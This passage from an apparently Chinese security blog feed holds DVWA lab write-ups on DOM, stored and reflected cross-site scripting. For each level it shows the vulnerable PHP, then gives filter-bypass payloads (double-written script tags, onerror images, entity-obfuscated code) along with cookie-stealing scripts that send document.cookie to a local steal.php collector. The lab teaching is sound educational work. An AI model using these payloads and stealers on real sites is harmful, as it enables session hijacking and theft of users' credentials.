value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123;</span><br><span class="line">$default=$_GET[&apos;default&apos;];</span><br><span class="line">switch($default)&#123;</span><br><span class="line">case &apos;English&apos;:break;</span><br><span class="line">case &apos;French&apos;:break;</span><br><span class="line">case &apos;Spanish&apos;:break;</span><br><span class="line">case &apos;German&apos;:break;</span><br><span class="line">default:header(&quot;location:?default=English&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出default值如果不是选项中的四个值，就重定向到选项为English</p><p>跟上一关一样，依然可以采用字符#绕过过滤</p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?#default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹框 </p><p>输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?#default=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">cookie.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功截取到cookie值 </p>]]></content>
    
    <summary type="html">
    
      dvwa-xss
    
    </summary>
    
      <category term="dvwa-xss" scheme="https://Foxgrin.github.io/categories/dvwa-xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-xss(stored)</title>
    <link href="https://Foxgrin.github.io//posts/64824/"/>
    <id>https://Foxgrin.github.io//posts/64824/</id>
    <published>2018-07-11T12:47:00.000Z</published>
    <updated>2018-07-11T13:33:57.097Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的存储型xss关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(<span class="string">'security'</span>,<span class="string">'low'</span>,time()+<span class="number">3600</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connection.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'btnSign'</span>]))&#123;</span><br><span class="line">$name=trim($_POST[<span class="string">'txtName'</span>]);</span><br><span class="line">$message=trim($_POST[<span class="string">'mtxMessage'</span>]);</span><br><span class="line">$message=stripslashes($message);</span><br><span class="line">$message=mysql_real_escape_string($message);</span><br><span class="line">$name=mysql_real_escape_string($name);</span><br><span class="line">$sql=<span class="string">"INSERT INTO guestbook (comment,name) VALUES ('$message','$name')"</span>;</span><br><span class="line">$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'btnClear'</span>]))&#123;</span><br><span class="line">$sql=<span class="string">"DELETE FROM guestbook"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT name,comment FROM guestbook"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"><span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Name:"</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Message:"</span>.$row[<span class="string">'comment'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从代码可以看出将我们POST的name和message写入数据库，并且原原本本的输出存入数据库的name和message，所以很明显存在xss漏洞，这种属于存储型的xss，先将恶意脚本代码存入数据库中，然后用户每次访问网页时都会执行一次恶意代码 </p><p>我们在name中输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再次刷新页面依然会跳出提示框 </p><p>那么我们再按反射型xss关卡中的通过存入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">”http://127.0.0.1/demo/xss(reflected)/cookie.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>来跳转到steal.php</p><p>再将cookie值存入数据库的方法试一下 </p><p><img src="/img/dvwa-xss-stored/2.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功写入cookie值</p><p>但是再次刷新进入页面时，每次都会跳转回steal.php，并写入一次cookie值，这难免会引起用户的怀疑</p><p>这里可以采用ajax技术，即创建一个用javascript代码创建一个XMLHttpRequest对象，这个对象可以在后台与服务器交换数据，就不需要跳转到steal.php了</p><p>脚本如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">"http://127.0.0.1/demo/xss(reflected)/steal.php"</span>;</span><br><span class="line"><span class="keyword">var</span> postStr = <span class="string">"data="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="keyword">var</span> ajax = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">    ajax = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ajax=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">ajax.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</span><br><span class="line">ajax.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">ajax.send(postStr);</span><br></pre></td></tr></table></figure><p>然后POST </p><p><img src="/img/dvwa-xss-stored/4.png" alt=""></p><p>每次访问页面都会讲cookie值写入数据库 </p><p><img src="/img/dvwa-xss-stored/5.png" alt=""></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);</span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))&#123;</span><br><span class="line">$message=trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">$name=trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">$message=strip_tags($message);</span><br><span class="line">$message=mysql_real_escape_string($message);</span><br><span class="line">$message=htmlspecialchars($message);</span><br><span class="line">$name=mysql_real_escape_string($name);</span><br><span class="line">$name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$name);</span><br><span class="line">$sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnClear&apos;]))&#123;</span><br><span class="line">$sql=&quot;DELETE FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT name,comment FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出这关对message进行了丢弃标签的过滤，而且使用了htmlspecialchars这个函数，这个函数可以使html标签实体化，让标签不再是标签，完全防止了xss注入，所以这关只能在name注入，但是name同时也过滤了script标签，但是没事，跟之前关卡一样，我们可以采用双写绕过过滤 </p><p>在name中输入 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert(‘xss’)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹窗</p><p>那么继续思考如何窃取cookie，答案就是双写</p><p>输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript src=’cookie.js’&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);</span><br><span class="line">include(&quot;../sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))&#123;</span><br><span class="line">$message=trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">$name=trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">$message=strip_tags($message);</span><br><span class="line">$message=mysql_real_escape_string($message);</span><br><span class="line">$message=htmlspecialchars($message);</span><br><span class="line">$name=mysql_real_escape_string($name);</span><br><span class="line">$name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$name);                                                                                                                                                         </span><br><span class="line">$sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnClear&apos;]))&#123;</span><br><span class="line">$sql=&quot;DELETE FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT name,comment FROM guestbook&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里对name进行了正则匹配过滤掉了包含按顺序的&lt;,s,c,r,i,p,t字符组成的字符串，所以这里只能通过触发onerror事件来执行js代码</p><p>通过加载图片过程发生异常触发onerror事件</p><p>在name中输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(‘xss’))</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">'var url="http://127.0.0.1/demo/xss(reflected)/steal.php";var postStr="data="+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject("M&amp;#x69;crosoft.XMLHTTP");&#125;else&#123;ajax=null;&#125;ajax.open("POST", url, true);ajax.setRequestHeader("Content-Type", "appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded");ajax.send(postStr);'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将ajax代码执行，将cookie值POST到steal.php</p><p>但在输入之前，我们应该先改一下数据列name的长度，之前设定长度为100，但是我们输入的明显超过了100,在mysql命令行输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table guestbook modify name varchar(500);</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-stored/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p>]]></content>
    
    <summary type="html">
    
      dvwa-xss
    
    </summary>
    
      <category term="dvwa-xss" scheme="https://Foxgrin.github.io/categories/dvwa-xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-xss(reflected)</title>
    <link href="https://Foxgrin.github.io//posts/52787/"/>
    <id>https://Foxgrin.github.io//posts/52787/</id>
    <published>2018-07-11T11:42:00.000Z</published>
    <updated>2018-07-11T13:35:48.318Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的反射型xss关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当我们GET一个name值以后，服务器毫无过滤的通过echo输出我们GET的name值，而如果我们输入的是一串代码，则这串代码通过echo就会被执行，这就是反射型的xss漏洞，我们可以通过GET方式输入一串js代码构造一个注入js代码的网页，当受害者访问这个url时，js代码将会自动实现，从而达到恶意攻击目的</p><p>比如我们输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('xss')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>于是我们可以利用这个xss漏洞获取服务器的cookie值，然后将cookie值存入数据库</p><p>先创建一个存放cookie的数据库</p><p>在mysql命令行输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create database dvwacookie;</span><br><span class="line"></span><br><span class="line">use  dvwacookie;</span><br><span class="line"></span><br><span class="line">create table low</span><br><span class="line"></span><br><span class="line">(</span><br><span class="line"></span><br><span class="line">id int primary key,</span><br><span class="line"></span><br><span class="line">cookie varchar(100) </span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>然后在编写一个cookie.js的脚本 </p><p><img src="/img/dvwa-xss-reflected/2.png" alt=""></p><p>这个脚本作用是创建隐藏表单，表单提交到steal.php，提交的内容是cookie值</p><p>接下来编写steal.php，自然就是将提交cookie值写入数据库里了</p><p>steal.php代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$con=mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">mysql_select_db(&apos;dvwacookie&apos;,$con);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;data&apos;]))&#123;</span><br><span class="line">$sql=&quot;INSERT INTO low(cookie) VALUES (&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;)&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后回到存在xss漏洞的网页，通过GET传入name值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">cookie.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查看数据库</p><p><img src="/img/dvwa-xss-reflected/4.png" alt=""></p><p>成功获得cookie值 </p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123;</span><br><span class="line">$name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$_GET[&apos;name&apos;]);</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>源代码利用了str_replace函数对script标签进行了过滤</p><p>不过没关系，因为函数只执行了一次，所以用双写的方法就可以很轻松的解决</p><p>输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert('xss')&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>之后跟low关卡一样，输入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript src=cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>获得cookie值 </p><p><img src="/img/dvwa-xss-reflected/6.png" alt=""></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123;</span><br><span class="line">$name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$_GET[&apos;name&apos;]);</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关利用了一个正则匹配过滤函数，i表示大小写，也就是以&lt;开头，以t结尾的字符串，只要中间按顺序包含&lt;script，则会立刻被过滤掉，之前双写绕过过滤的方法在这里行不通</p><p>绕过方法是采用触发onerror事件来执行javascript代码</p><p>onerror事件会在文档或者图像加载过程中发生错误时触发</p><p>例如，我们输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(“xss”)</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然，加载图片时发现不存在这个图片发生错误所以触发了onerror事件，然后执行了alert(“xss”)代码 </p><p>那么我们再考虑怎么像之前两关一样获得cookie值</p><p>之前是通过script标签的src属性引用外部的cookie.js文件，将cookie值以POST形式传入steal.php，再将POST的cookie值写入数据库</p><p>但是很明显这关对script标签做了正则过滤，只要我们输入含有这几个字符，都会被过滤掉，所以这里可以用location.href跳转链接到steal.php，将cookie值写入数据库，所以这里只能用GET方式将cookie值传入steal.php</p><p>于是输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(location.href</span>=<span class="string">”http://127.0.0.1/demo/xss(reflected)/steal.php?data</span>=<span class="string">”+document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是结果却是</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>为什么呢</p><p>仔细检查发现我们输入里面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">SrC</span>=<span class="string">#</span> <span class="attr">oneRror</span>=<span class="string">(locatIon.href</span>=<span class="string">”httP://127.0.0.1/demo/xss(reflected)/steal.php?data</span>=<span class="string">”+document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>大写字母构成了&lt;script，所以被过滤掉了</p><p>所以我们可以采用先获得cookie值，然后将cookie值传入steal.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-reflected/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(document.cookie))</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在将这个cookie值传入steal.php</p><p>还有种方法是对某个关键过滤字符进行html编码，但是我亲测不行，不知道什么原因，还望大神指点原因</p>]]></content>
    
    <summary type="html">
    
      dvwa-xss
    
    </summary>
    
      <category term="dvwa-xss" scheme="https://Foxgrin.github.io/categories/dvwa-xss/"/>
    
    
      <category term="xss" scheme="https://Foxgrin.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-sql(blind)</title>
    <link href="https://Foxgrin.github.io//posts/55409/"/>
    <id>https://Foxgrin.github.io//posts/55409/</id>
    <published>2018-07-11T07:39:00.000Z</published>
    <updated>2018-07-11T10:36:59.664Z</updated>
    
